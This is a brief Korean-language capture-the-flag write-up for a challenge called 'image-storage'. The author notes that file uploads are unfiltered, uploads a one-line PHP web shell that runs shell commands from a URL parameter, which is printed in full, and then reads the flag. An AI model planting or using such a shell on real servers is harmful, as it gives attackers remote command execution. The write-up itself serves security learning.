# image-storage

소스코드를 보니 업로드 되는 파일에 필터링이 없어서 바로 간단한 웹 쉘을 업로드 해보았다.   

### web shell
```
<?php
echo shell_exec($_GET['cmd']);
?>
```   
<br/>

![image1](1.PNG)   

성공적으로 업로드가 되어서 쉽게 flag를 확인할 수 있었다.    
![image2](2.PNG)
